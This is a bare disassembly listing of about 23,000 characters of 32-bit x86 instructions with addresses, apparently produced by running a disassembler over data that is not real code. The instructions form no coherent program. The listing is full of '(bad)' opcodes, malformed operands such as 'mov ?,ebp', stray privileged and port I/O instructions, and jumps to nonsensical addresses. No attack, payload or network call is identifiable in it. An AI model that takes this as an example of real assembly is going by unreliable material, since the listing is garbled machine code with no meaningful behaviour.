  428f0e:	fst    DWORD PTR [eax+eiz*4]
  428f11:	sbb    eax,0x42c1952d
  428f16:	sub    BYTE PTR [ecx+0x36439a86],dh
  428f1c:	mov    ds:0xc8761aea,al
  428f21:	adc    eax,0xa1641b35
  428f26:	inc    esp
  428f27:	loopne 0x428f7b
  428f29:	dec    ebx
  428f2a:	imul   esp,DWORD PTR [ebx],0xef7b02f7
  428f30:	cmp    DWORD PTR [esi],edx
  428f32:	push   ebx
  428f33:	dec    esp
  428f34:	push   esi
  428f35:	jo     0x428f2a
  428f37:	add    BYTE PTR [esi],dl
  428f39:	add    al,0xb6
  428f3b:	push   ebx
  428f3c:	cld    
  428f3d:	xor    eax,0xdb0033ff
  428f42:	xchg   esi,eax
  428f43:	xchg   edx,eax
  428f44:	outs   dx,BYTE PTR ds:[esi]
  428f45:	mov    edi,0xb5accc0e
  428f4a:	xchg   BYTE PTR [edx+0x5e],ah
  428f4d:	pop    es
  428f4e:	ret    
  428f4f:	cmp    ebp,DWORD PTR [eax-0x1ce43b2a]
  428f55:	adc    DWORD PTR [esi+0x4166537],ecx
  428f5b:	js     0x428f97
  428f5d:	adc    bh,BYTE PTR [edx-0x7e543dc9]
  428f63:	inc    ebp
  428f64:	std    
  428f65:	dec    edx
  428f66:	dec    edi
  428f67:	push   ebp
  428f68:	dec    edi
  428f69:	(bad)  
  428f6a:	pop    ebp
  428f6b:	mov    eax,ds:0xddd75f4c
  428f70:	cwde   
  428f71:	mov    bh,0x57
  428f73:	retf   0x3546
  428f76:	out    dx,al
  428f77:	pop    ebx
  428f78:	aas    
  428f79:	rcl    DWORD PTR [edi+0x152ec5a7],1
  428f7f:	dec    ecx
  428f80:	sub    esp,eax
  428f82:	pop    edi
  428f83:	inc    esp
  428f84:	ins    DWORD PTR es:[edi],dx
  428f85:	adc    ch,BYTE PTR [ebx]
  428f87:	std    
  428f88:	test   DWORD PTR [ebp-0x3c683790],edi
  428f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428f8f:	jno    0x428f3d
  428f91:	ss dec edi
  428f93:	push   cs
  428f94:	stos   DWORD PTR es:[edi],eax
  428f95:	sti    
  428f96:	jae    0x428f30
  428f98:	fiadd  DWORD PTR [esi]
  428f9a:	leave  
  428f9b:	mov    eax,ds:0x609d3fd4
  428fa0:	dec    ebp
  428fa1:	and    cl,BYTE PTR [edi-0x3f]
  428fa4:	test   al,0x29
  428fa6:	leave  
  428fa7:	add    esp,0x21163782
  428fad:	inc    ecx
  428fae:	or     ch,ch
  428fb0:	out    0x6a,eax
  428fb2:	sbb    bh,bl
  428fb4:	loopne 0x428fff
  428fb6:	mov    ds:0x1774adae,eax
  428fbb:	lock mov dl,BYTE PTR [esi]
  428fbe:	jmp    0x8c62dd4c
  428fc3:	ret    0x7826
  428fc6:	push   ecx
  428fc7:	icebp  
  428fc8:	les    ebx,FWORD PTR [ecx+ebp*1-0x1fd8f84b]
  428fcf:	mov    ecx,0xe1c3d50e
  428fd4:	jge    0x428fde
  428fd6:	cmovbe edi,DWORD PTR [ebp+esi*2+0x68]
  428fdb:	rol    BYTE PTR [esi+edi*1+0x29],0x56
  428fe0:	inc    eax
  428fe1:	and    edi,DWORD PTR [ecx+ecx*4-0x677ec53]
  428fe8:	mov    ds:0xd1de9e39,eax
  428fed:	gs sbb bh,bh
  428ff0:	(bad)  
  428ff1:	cmp    esp,0xffffffd2
  428ff4:	aas    
  428ff5:	or     eax,0x7e51e30a
  428ffa:	adc    al,0xc8
  428ffc:	pop    esp
  428ffd:	inc    edx
  428ffe:	iret   
  428fff:	ss push 0x12
  429002:	repz pop edi
  429004:	icebp  
  429005:	mov    bh,0x1d
  429007:	cmp    al,0xb2
  42900a:	dec    edi
  42900b:	inc    ecx
  42900c:	xlat   BYTE PTR ds:[ebx]
  42900d:	cld    
  42900e:	retf   
  42900f:	mov    al,ds:0x0
	...
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x4dfc7b77
  429081:	mov    cl,0x6
  429083:	pop    edi
  429084:	pusha  
  429085:	mov    dh,0x1
  429087:	add    BYTE PTR [ecx+eax*1],al
  42908a:	add    BYTE PTR [eax],al
  42908c:	ret    0x48e2
  42908f:	fsub   st,st(4)
  429091:	mov    ch,0xda
  429093:	outs   dx,BYTE PTR ds:[esi]
  429094:	dec    edi
  429095:	inc    ebp
  429096:	mov    al,0x6d
  429098:	sbb    eax,0xbdb3ddd8
  42909d:	popa   
  42909e:	imul   ecx,esi,0xa8e80d6a
  4290a4:	add    eax,0x18298b59
  4290a9:	mov    edi,0x2936529d
  4290ae:	sti    
  4290af:	dec    ebx
  4290b0:	jns    0x42905b
  4290b2:	push   0x36d594ca
  4290b7:	lods   al,BYTE PTR ds:[esi]
  4290b8:	cs sbb al,0xee
  4290bb:	sub    esp,ebx
  4290bd:	jne    0x42913e
  4290bf:	xchg   ebx,eax
  4290c0:	or     bl,dh
  4290c2:	xchg   ecx,eax
  4290c3:	sub    DWORD PTR gs:[ecx+0x6e5bb9ec],0x87902b38
  4290ce:	jmp    0x84a171b6
  4290d3:	xchg   edi,eax
  4290d4:	dec    esp
  4290d5:	mov    BYTE PTR ds:0xf518441e,dh
  4290db:	jbe    0x4290cc
  4290dd:	push   esi
  4290de:	pop    ecx
  4290df:	pop    ebx
  4290e0:	inc    edi
  4290e1:	mov    cl,0x7f
  4290e3:	xchg   ecx,eax
  4290e4:	pop    ebp
  4290e5:	dec    ebx
  4290e6:	or     ah,BYTE PTR [edi]
  4290e8:	sbb    ch,BYTE PTR [ecx-0x66105bc9]
  4290ee:	mov    al,ds:0x8b4967c1
  4290f3:	dec    edi
  4290f4:	in     al,dx
  4290f5:	fnstcw WORD PTR [esi+eax*1]
  4290f8:	and    al,0xd4
  4290fa:	xchg   edi,eax
  4290fb:	inc    ebp
  4290fc:	out    0x7,eax
  4290fe:	mov    ah,0xa6
  429100:	cld    
  429101:	popf   
  429102:	fmul   st,st(6)
  429104:	inc    eax
  429105:	mov    al,0x2a
  429107:	xchg   edx,eax
  429108:	mov    edx,es
  42910a:	sti    
  42910b:	popa   
  42910c:	mov    DWORD PTR [ebx+edx*8-0x62],ebx
  429110:	adc    cl,al
  429112:	xchg   edx,ebp
  429114:	pop    ebx
  429115:	cld    
  429116:	push   ebx
  429117:	dec    edx
  429118:	jno    0x42911e
  42911a:	in     eax,0x81
  42911c:	xchg   edx,eax
  42911d:	fistp  WORD PTR [ecx+0x54a81973]
  429123:	iret   
  429124:	and    al,0xf9
  429126:	test   al,0x0
  429128:	fistp  WORD PTR [ebx+0x70425e27]
  42912e:	pop    esi
  42912f:	and    ebx,ecx
  429131:	mov    esi,0x2f27e80e
  429136:	hlt    
  429137:	adc    al,0xb5
  429139:	ficom  DWORD PTR [ecx-0x1c]
  42913c:	fsub   DWORD PTR [eax]
  42913e:	fs xchg cl,dh
  429141:	xchg   edi,ecx
  429143:	mov    bh,0x2e
  429145:	mov    edi,0xf6ce33ea
  42914a:	cmp    ch,0x1a
  42914d:	pop    eax
  42914e:	mov    esp,0xee614839
  429153:	pop    edx
  429154:	jo     0x42915e
  429156:	jge    0x42912a
  429158:	cpuid  
  42915a:	jbe    0x429188
  42915c:	test   BYTE PTR [edx+eiz*4+0x1530b98f],bh
  429163:	enter  0xfd53,0xa2
  429167:	sbb    dl,BYTE PTR [ebp+0x4acd69e3]
  42916d:	sub    ebp,DWORD PTR [edx+0x3f4dde44]
  429173:	in     eax,dx
  429174:	xchg   edx,eax
  429175:	mov    eax,0xacab0657
  42917a:	xchg   edi,eax
  42917b:	je     0x4291ad
  42917d:	shl    BYTE PTR [ebx-0x72],0x65
  429181:	aaa    
  429182:	xor    BYTE PTR [ebx],ch
  429184:	jns    0x429113
  429186:	dec    ecx
  429187:	cwde   
  429188:	retf   
  429189:	xchg   esi,eax
  42918a:	xor    DWORD PTR [esi-0x54],eax
  42918d:	pop    edi
  42918e:	adc    BYTE PTR ds:0x0,dh
	...
  4291f4:	push   esi
  4291f5:	xchg   ebp,edi
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [eax+edx*8+0x649281e8],0x40001b7
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    BYTE PTR [esi+0x5c],al
  42920e:	stc    
  42920f:	bound  esi,QWORD PTR [esi+0x1a]
  429212:	pop    esi
  429213:	push   esp
  429214:	or     esi,esp
  429216:	push   0xf5be0b87
  42921b:	stos   BYTE PTR es:[edi],al
  42921c:	jmp    0x429219
  42921e:	pop    eax
  42921f:	(bad)  
  429221:	xor    bl,BYTE PTR [edi]
  429223:	aaa    
  429224:	icebp  
  429225:	push   ss
  429226:	arpl   cx,sp
  429228:	or     dl,ch
  42922a:	inc    ebp
  42922b:	xor    BYTE PTR [esi+0x1d],ah
  42922e:	cdq    
  42922f:	cmp    al,dh
  429231:	xchg   eax,ebp
  429233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429235:	and    ebx,DWORD PTR [edi-0x46f4b712]
  42923b:	enter  0xbb32,0x81
  42923f:	ficom  WORD PTR [edi]
  429241:	shl    DWORD PTR [esi+0x6e4b995a],0x82
  429248:	js     0x4292c4
  42924a:	or     edi,DWORD PTR [edx-0x78046076]
  429250:	adc    al,ch
  429252:	dec    esi
  429253:	(bad)  
  429254:	jmp    0x42923f
  429256:	fld    QWORD PTR [edi]
  429258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429259:	mov    eax,0x94c72857
  42925e:	es cmc 
  429260:	out    0x25,al
  429262:	jo     0x4292ce
  429264:	mov    al,ds:0xe5566395
  429269:	or     DWORD PTR [edx],0x21
  42926c:	inc    ecx
  42926d:	mov    eax,ds:0x501a3641
  429272:	imul   ecx,DWORD PTR [edi],0x85c7c718
  429278:	sub    cl,BYTE PTR [eax+0x9]
  42927b:	test   BYTE PTR [ebx+0x44],dl
  42927e:	or     eax,0x73bd1bd
  429283:	jne    0x429207
  429285:	cld    
  429286:	js     0x4292d3
  429288:	sub    eax,0x7bbe574b
  42928d:	jb     0x429232
  42928f:	test   DWORD PTR [ebx],esp
  429291:	clc    
  429292:	fild   QWORD PTR [esi]
  429294:	es jmp 0x429275
  429297:	out    dx,al
  429298:	sbb    BYTE PTR [ebp+0x347b97d6],cl
  42929e:	mov    ds:0x1c989add,al
  4292a3:	mov    ch,0x75
  4292a5:	mov    bh,0xc9
  4292a7:	mov    ecx,0xc47a3dab
  4292ac:	or     al,0x83
  4292ae:	int    0xcb
  4292b0:	mov    bl,BYTE PTR [esi-0x74e95c2b]
  4292b6:	jmp    0x42927c
  4292b8:	andps  xmm3,xmm6
  4292bb:	add    esi,0xb5ba1221
  4292c1:	pusha  
  4292c2:	inc    esi
  4292c3:	out    0xc6,eax
  4292c5:	clc    
  4292c6:	mov    al,ds:0x4620deed
  4292cb:	sub    DWORD PTR [edi-0x18],ebx
  4292ce:	inc    ebx
  4292cf:	jle    0x4292c5
  4292d1:	js     0x4292d7
  4292d3:	sbb    DWORD PTR [esp+eiz*4+0x16cc9b5b],edx
  4292da:	or     al,0xa9
  4292dc:	fcmovne st,st(7)
  4292de:	jge    0x4292cd
  4292e0:	or     DWORD PTR [ebp-0x2d],0xda20952
  4292e7:	jbe    0x429311
  4292e9:	sbb    DWORD PTR [ecx],esp
  4292eb:	sbb    esp,DWORD PTR [ecx+0x490378e9]
  4292f1:	sbb    edx,edx
  4292f3:	fld    DWORD PTR [ebp-0x4f]
  4292f6:	lahf   
  4292f7:	cmp    edx,DWORD PTR [edi+0xd]
  4292fa:	outs   dx,BYTE PTR ds:[esi]
  4292fb:	push   0x4e
  4292fd:	int3   
  4292fe:	add    DWORD PTR [ecx+0x4e],ecx
  429301:	call   0x3a2e46fd
  429306:	xchg   DWORD PTR [edi],esi
  429308:	shl    BYTE PTR [edx+0x67],0x17
  42930c:	mov    ?,ebp
  42930e:	cli    
  42930f:	jne    0x429311
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0xfd
  429381:	mov    al,ds:0xb86802e4
  429386:	add    DWORD PTR [eax],eax
  429388:	add    al,0x1
  42938a:	add    BYTE PTR [eax],al
  42938c:	jne    0x429335
  42938e:	jmp    0x9fd9e94
  429393:	nop
  429394:	push   ss
  429395:	jnp    0x42934c
  429397:	mov    ebp,DWORD PTR [ebp+0x2b]
  42939a:	ins    BYTE PTR es:[edi],dx
  42939b:	mov    edi,0x1f87925
  4293a0:	fwait
  4293a1:	add    eax,0x39091d6d
  4293a6:	xor    BYTE PTR ds:0x761943af,ch
  4293ac:	test   eax,0x51458968
  4293b1:	mov    ch,0x33
  4293b3:	(bad)  
  4293b4:	mov    cl,0x9
  4293b6:	mov    ch,BYTE PTR [ebx]
  4293b8:	mov    eax,0x533e38af
  4293bd:	adc    DWORD PTR [esp+edi*4-0x3b],0x746efc82
  4293c5:	xchg   esi,eax
  4293c6:	push   0x3abccf
  4293cb:	in     eax,dx
  4293cc:	stc    
  4293cd:	ds cmc 
  4293cf:	xchg   esp,eax
  4293d0:	adc    al,0x1b
  4293d2:	loop   0x4293f8
  4293d4:	daa    
  4293d5:	jo     0x429372
  4293d7:	and    BYTE PTR [edx-0x70],0x6b
  4293db:	jbe    0x429431
  4293dd:	mov    eax,ds:0xd7e78574
  4293e2:	in     eax,0x9d
  4293e4:	in     al,0x63
  4293e6:	stc    
  4293e7:	inc    ecx
  4293e8:	xor    dl,BYTE PTR [edx+ebp*1+0x4e]
  4293ec:	pop    ss
  4293ed:	adc    DWORD PTR [bx+si],ebp
  4293f0:	or     BYTE PTR [ecx+0x33f05b49],cl
  4293f6:	pop    eax
  4293f7:	push   ss
  4293f8:	scas   eax,DWORD PTR es:[edi]
  4293f9:	scas   eax,DWORD PTR es:[edi]
  4293fa:	hlt    
  4293fb:	es cmp al,0x79
  4293fe:	pop    edx
  4293ff:	fisubr WORD PTR [edi]
  429401:	mov    ebx,0xdc57c97e
  429406:	push   ebx
  429407:	push   ebp
  429408:	push   ebx
  429409:	cmp    eax,0xe53c9e3c
  42940e:	xchg   esp,eax
  42940f:	les    ebx,FWORD PTR [esi+0x3]
  429412:	ins    DWORD PTR es:[edi],dx
  429413:	adc    BYTE PTR [ebx+0x49],dh
  429416:	push   eax
  429417:	or     bl,BYTE PTR [edi+0x48]
  42941a:	test   edi,eax
  42941c:	pop    esi
  42941d:	cwde   
  42941e:	test   BYTE PTR [eax],dh
  429420:	mov    eax,0x5384bc3c
  429425:	cdq    
  429426:	rol    dl,cl
  429428:	es test al,0xa4
  42942b:	imul   BYTE PTR [eax-0x587007e]
  429431:	pop    ecx
  429432:	dec    ecx
  429433:	cmp    ecx,esi
  429435:	scas   al,BYTE PTR es:[edi]
  429436:	retf   
  429437:	hlt    
  429438:	push   eax
  429439:	and    eax,0x4113e31a
  42943e:	push   esi
  42943f:	xor    BYTE PTR [eax-0x610d68df],dl
  429445:	leave  
  429446:	(bad)
  42944a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42944b:	fnsave es:[eax-0x16]
  42944f:	stos   BYTE PTR es:[edi],al
  429450:	ffree  st(0)
  429452:	in     eax,0x3
  429454:	jle    0x429411
  429456:	test   BYTE PTR [ebp+0x41],0x47
  42945a:	popf   
  42945b:	test   eax,0x394848a6
  429460:	cmc    
  429461:	and    DWORD PTR [ecx],ebx
  429463:	fstp   TBYTE PTR [ebp-0x6b]
  429466:	push   es
  429467:	les    edi,FWORD PTR [ebp+0x61b99361]
  42946d:	shr    DWORD PTR [esi],cl
  42946f:	xor    BYTE PTR [ecx+0x4b],bl
  429472:	inc    edi
  429473:	sbb    eax,DWORD PTR [eax]
  429475:	bound  ebx,QWORD PTR [ebx]
  429477:	add    BYTE PTR [ecx+0x38],bl
  42947a:	inc    edx
  42947b:	les    esi,FWORD PTR [eax+ebp*2+0x3f]
  42947f:	mov    ds:0x9e6105f3,eax
  429484:	jmp    0x9485:0xc44fd723
  42948b:	mov    ah,0x75
  42948d:	mov    ch,0x1a
  42948f:	sti    
	...
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x4109d16],dx
  429503:	aam    0x6c
  429505:	mov    ecx,0x1040001
  42950a:	add    BYTE PTR [eax],al
  42950c:	imul   esp,DWORD PTR [edx+0x25c50f03],0xffffffa7
  429513:	xlat   BYTE PTR ds:[ebx]
  429514:	pop    edx
  429515:	sar    BYTE PTR [ecx+eiz*4-0x3f],0xb4
  42951a:	push   ds
  42951b:	lahf   
  42951c:	loopne 0x429574
  42951e:	ret    0x68e0
  429521:	xchg   ebp,eax
  429522:	xchg   ecx,eax
  429523:	scas   eax,DWORD PTR es:[edi]
  429524:	stos   DWORD PTR es:[edi],eax
  429525:	jo     0x4294c9
  429527:	inc    ecx
  429528:	sub    dl,ah
  42952a:	mov    cl,0x6b
  42952c:	outs   dx,BYTE PTR ds:[esi]
  42952d:	mov    DWORD PTR [edx],eax
  42952f:	pop    edi
  429530:	clc    
  429531:	jge    0x4294f4
  429533:	xor    dh,ch
  429535:	push   0x377d98d8
  42953a:	mov    al,ds:0x4b200a02
  42953f:	push   0xb6723f2c
  429544:	test   BYTE PTR [esi-0x5227100f],al
  42954a:	ins    DWORD PTR es:[edi],dx
  42954b:	pop    ebp
  42954c:	ds jmp 0x139a54ec
  429552:	loop   0x429529
  429554:	push   edx
  429555:	sbb    bh,0xa1
  429558:	mov    eax,ds:0x40718bff
  42955d:	mov    ah,0xe0
  42955f:	and    eax,DWORD PTR [ebx+0x6c]
  429562:	into   
  429563:	mov    eax,DWORD PTR [ebx]
  429565:	jp     0x42950f
  429567:	aam    0x3a
  429569:	fcomp  DWORD PTR [ecx+0x31]
  42956c:	pusha  
  42956d:	inc    esp
  42956e:	inc    ebx
  42956f:	mov    dh,0x4d
  429571:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429572:	inc    edx
  429573:	dec    edx
  429574:	mov    esi,0xd70f1f3c
  429579:	bound  ecx,QWORD PTR [ebx+0x40f9edcd]
  42957f:	sub    eax,DWORD PTR [edx+0x2ddb42d2]
  429585:	or     DWORD PTR [ebx],ebx
  429587:	outs   dx,DWORD PTR ds:[esi]
  429588:	arpl   WORD PTR gs:[ebp-0x3a],si
  42958c:	and    eax,0xadc0ba9e
  429591:	fstp   QWORD PTR [edx-0x4880493a]
  429597:	adc    BYTE PTR [edi],dl
  429599:	int    0xce
  42959b:	loope  0x42952d
  42959d:	mul    ch
  42959f:	jae    0x42953f
  4295a1:	ja     0x429552
  4295a3:	and    BYTE PTR [edx+esi*8-0x9fd5907],dh
  4295aa:	cwde   
  4295ab:	mov    WORD PTR [esi],fs
  4295ad:	dec    ebx
  4295ae:	imul   bx,WORD PTR [esi-0x15],0x55
  4295b3:	ror    DWORD PTR [ebp+0xd],1
  4295b6:	push   ecx
  4295b7:	stos   DWORD PTR es:[edi],eax
  4295b8:	mov    bh,0x76
  4295ba:	sbb    BYTE PTR [eax],cl
  4295bc:	rcr    ah,0xf8
  4295bf:	xor    eax,DWORD PTR [esi-0x8]
  4295c2:	adc    BYTE PTR [ecx+0x654c319e],cl
  4295c8:	adc    ch,al
  4295ca:	(bad)  
  4295cb:	sub    DWORD PTR [esi+0x1b],ecx
  4295ce:	mov    ds:0x5aedaa4a,eax
  4295d3:	xchg   edi,eax
  4295d4:	adc    BYTE PTR fs:[edx+0x60],dh
  4295d8:	mov    ?,WORD PTR [eax]
  4295da:	dec    eax
  4295db:	lahf   
  4295dc:	mov    ds:0x173727d8,al
  4295e1:	inc    esi
  4295e2:	and    edi,DWORD PTR [edi+0x7ae99169]
  4295e8:	dec    ebx
  4295e9:	ret    
  4295ea:	xor    eax,0xac5fab22
  4295ef:	dec    ecx
  4295f0:	cmp    ecx,edx
  4295f2:	jg     0x42957d
  4295f4:	mov    ch,0xc5
  4295f6:	into   
  4295f7:	int    0xbc
  4295f9:	cmp    DWORD PTR ds:0x32b8a987,0xffffffc9
  429600:	pop    ebp
  429601:	stos   BYTE PTR es:[edi],al
  429602:	mov    ecx,0x9964763c
  429607:	scas   eax,DWORD PTR es:[edi]
  429608:	inc    ecx
  429609:	loopne 0x4295b6
  42960b:	add    ah,dl
  42960d:	out    dx,al
  42960e:	fisttp WORD PTR [ecx]
	...
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	ret    0xe5b8
  429683:	mov    ds:0x1ba70,al
  429688:	add    al,0x1
  42968a:	add    BYTE PTR [eax],al
  42968c:	xchg   BYTE PTR [ebx+esi*4],cl
  42968f:	scas   al,BYTE PTR es:[edi]
  429690:	jnp    0x429687
  429692:	jne    0x42963a
  429694:	add    ebx,DWORD PTR [eax-0xd1162a4]
  42969a:	inc    ebx
  42969b:	and    BYTE PTR [ebp+eax*1-0x27],0xb2
  4296a0:	dec    esp
  4296a1:	inc    eax
  4296a2:	mov    dl,0xcc
  4296a4:	or     eax,DWORD PTR [ecx-0x2e]
  4296a7:	xchg   esi,eax
  4296a8:	jno    0x42970e
  4296aa:	dec    ebx
  4296ab:	push   ebx
  4296ac:	and    BYTE PTR ds:0x10147d83,0xe3
  4296b3:	in     eax,0x7f
  4296b5:	(bad)  
  4296b6:	aas    
  4296b7:	test   al,0xbe
  4296b9:	jecxz  0x4296bd
  4296bb:	nop
  4296bc:	in     al,0x20
  4296be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296bf:	jecxz  0x4296aa
  4296c1:	call   0x34a5117f
  4296c6:	cdq    
  4296c7:	jno    0x42964a
  4296c9:	push   edx
  4296ca:	xchg   edx,eax
  4296cb:	test   al,0xef
  4296cd:	xchg   DWORD PTR [edi+0x5a],ebx
  4296d0:	call   0xda70a1f4
  4296d5:	inc    edi
  4296d6:	pop    edi
  4296d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4296d8:	inc    esp
  4296d9:	repz dec edi
  4296db:	scas   al,BYTE PTR es:[edi]
  4296dc:	sbb    eax,0xeca7900e
  4296e1:	jle    0x42971a
  4296e3:	xchg   DWORD PTR [edx],esp
  4296e5:	xchg   esp,eax
  4296e6:	mov    edx,DWORD PTR [esi+esi*2+0x69]
  4296ea:	cli    
  4296eb:	or     eax,0x2f3482ab
  4296f0:	scas   al,BYTE PTR es:[edi]
  4296f1:	mov    ds:0x12d01540,eax
  4296f6:	add    ecx,esi
  4296f8:	sbb    cl,bh
  4296fa:	push   es
  4296fb:	lahf   
  4296fc:	xchg   esp,eax
  4296fd:	xchg   BYTE PTR [ebx+0x5ae3696b],cl
  429703:	jnp    0x429760
  429705:	mov    ebp,0x2024f7a7
  42970a:	cmp    al,0xd8
  42970c:	xchg   ebx,eax
  42970d:	sbb    BYTE PTR [edi+eax*4-0x1a],al
  429711:	shl    DWORD PTR [ecx-0x64c95a92],0xa
  429718:	xchg   ecx,ebp
  42971a:	inc    ebp
  42971b:	mov    ds:0x6b1f3e43,al
  429720:	and    al,0x71
  429722:	pop    ss
  429723:	pop    esp
  429724:	cld    
  429725:	cdq    
  429726:	pop    ss
  429727:	adc    DWORD PTR [edx],ebp
  429729:	sub    edi,DWORD PTR [edi-0x4a347b96]
  42972f:	out    dx,eax
  429730:	das    
  429731:	xchg   esi,eax
  429732:	inc    esp
  429733:	dec    ebx
  429734:	xlat   BYTE PTR ds:[ebx]
  429735:	icebp  
  429736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429737:	push   ecx
  429738:	jne    0x4296d9
  42973a:	es retf 0x5025
  42973e:	retf   
  42973f:	cmp    eax,0x989528a2
  429744:	dec    esp
  429745:	xor    eax,0x72810efb
  42974a:	les    ebx,FWORD PTR [edx+0x7a]
  42974d:	xchg   ebp,eax
  42974e:	aad    0xfd
  429750:	pop    ecx
  429751:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429752:	rcl    esp,0xc6
  429755:	and    al,0x1b
  429757:	ds jl  0x429703
  42975a:	inc    ebp
  42975b:	mov    esi,0x12f55940
  429760:	mov    ah,0xb3
  429762:	dec    esi
  429763:	or     al,0x46
  429765:	repnz int 0x33
  429768:	sbb    BYTE PTR [ebx+eiz*4-0x5c],0x81
  42976d:	and    ch,BYTE PTR [edi-0x7d]
  429770:	int3   
  429771:	ja     0x4297dd
  429773:	xchg   DWORD PTR [ebx+edx*1],ebp
  429776:	test   DWORD PTR ds:0xc773318a,edx
  42977c:	aam    0xfc
  42977e:	inc    esp
  42977f:	jns    0x429745
  429781:	adc    bl,BYTE PTR [ebx-0x55]
  429784:	xor    BYTE PTR [eax],ah
  429786:	inc    edx
  429787:	inc    eax
  429788:	ins    BYTE PTR es:[edi],dx
  429789:	pushf  
  42978a:	xlat   BYTE PTR ds:[ebx]
  42978b:	fimul  WORD PTR [esi]
  42978d:	adc    al,0x3f
  42978f:	and    al,0x0
	...
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	retf   0xfad0
  429803:	mov    ds:0x1bb74,al
  429808:	add    al,0x1
  42980a:	add    BYTE PTR [eax],al
  42980c:	add    al,0xa9
  42980e:	rcl    DWORD PTR [eax+0x3d],0xf2
  429812:	ins    BYTE PTR es:[edi],dx
  429813:	das    
  429814:	inc    esi
  429815:	jns    0x4297bf
  429817:	aaa    
  429818:	dec    eax
  429819:	dec    ebp
  42981a:	xor    BYTE PTR [edi-0x60ca53b8],cl
  429820:	fs iret 
  429822:	gs jbe 0x42980f
  429825:	cmp    DWORD PTR [ebp+0x6c],ebp
  429828:	fsub   QWORD PTR [edx+0x7]
  42982b:	lock mov dl,0xf
  42982e:	loope  0x4297bf
  429830:	gs xchg esp,eax
  429832:	jg     0x42989b
  429834:	and    DWORD PTR [edi-0x22],ebx
  429837:	jle    0x429819
  429839:	jo     0x429812
  42983b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42983c:	inc    edx
  42983d:	pop    ebx
  42983e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42983f:	jl     0x42982c
  429841:	fsubr  DWORD PTR [eax+0x1cd72195]
  429847:	in     eax,dx
  429848:	test   al,0x6d
  42984a:	sbb    al,0x73
  42984c:	cmc    
  42984d:	ja     0x4298b6
  42984f:	xchg   ebp,eax
  429850:	add    BYTE PTR [esi+0x15],bh
  429853:	xor    eax,0x94668f57
  429858:	cmp    BYTE PTR [esi-0x1078c2ae],bl
  42985e:	sub    ebp,DWORD PTR [esi]
  429860:	lahf   
  429861:	popf   
  429862:	pop    edx
  429863:	xchg   ch,cl
  429865:	(bad)  
  429866:	cs call 0x8093:0x665b6d2a
  42986e:	lahf   
  42986f:	mov    dl,0x9
  429871:	mov    dh,BYTE PTR [edi]
  429873:	or     ah,dl
  429875:	imul   ebp,DWORD PTR [edi-0x223948e3],0xc27b1b91
  42987f:	cmp    eax,eax
  429881:	pop    edi
  429882:	inc    eax
  429883:	add    DWORD PTR [ebx],ebp
  429885:	mov    esi,0x7619930
  42988a:	stos   DWORD PTR es:[edi],eax
  42988b:	inc    ebx
  42988c:	mov    ds:0x96affe23,al
  429891:	or     DWORD PTR [edi-0x291bc1c4],ecx
  429897:	idiv   al
  429899:	iret   
  42989a:	pop    ss
  42989b:	sub    esp,esi
  42989d:	sbb    eax,0x1d4b30ba
  4298a2:	push   eax
  4298a3:	jbe    0x42987f
  4298a5:	cdq    
  4298a6:	mov    edx,0x8732e7a1
  4298ab:	add    al,0x60
  4298ad:	cdq    
  4298ae:	or     bh,bh
  4298b0:	test   al,0x5
  4298b2:	pop    es
  4298b3:	pop    ebx
  4298b4:	and    eax,0x5690f8a2
  4298b9:	neg    BYTE PTR [edi-0x3b745394]
  4298bf:	mov    edi,0x29ba553c
  4298c4:	fs xor eax,0x91daec2e
  4298ca:	xchg   edx,eax
  4298cb:	xchg   esi,eax
  4298cc:	or     eax,0xb58db59a
  4298d1:	dec    ebp
  4298d2:	enter  0xa026,0xc4
  4298d6:	mov    esi,0x950dd03d
  4298db:	mov    edi,0x175773f1
  4298e0:	inc    ebx
  4298e1:	in     al,dx
  4298e2:	jbe    0x4298a7
  4298e4:	sub    al,0x8f
  4298e6:	sar    BYTE PTR [edi+edx*4-0x78],1
  4298ea:	(bad)  
  4298eb:	cmp    edx,DWORD PTR [edi+ecx*2+0x15]
  4298ef:	pop    ebp
  4298f0:	lahf   
  4298f1:	cs callw 0xe40a
  4298f6:	sbb    eax,0xed6c043f
  4298fb:	pop    ss
  4298fc:	jge    0x429909
  4298fe:	jmp    0xc017:0xc0a18ad1
  429905:	or     al,0xf5
  429907:	arpl   ax,bx
  429909:	mov    eax,ds:0x82814167
  42990e:	mov    edi,0xda
	...
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	mov    bh,0xf6
  429982:	in     al,0x5b
  429984:	js     0x429942
  429986:	add    DWORD PTR [eax],eax
  429988:	add    al,0x1
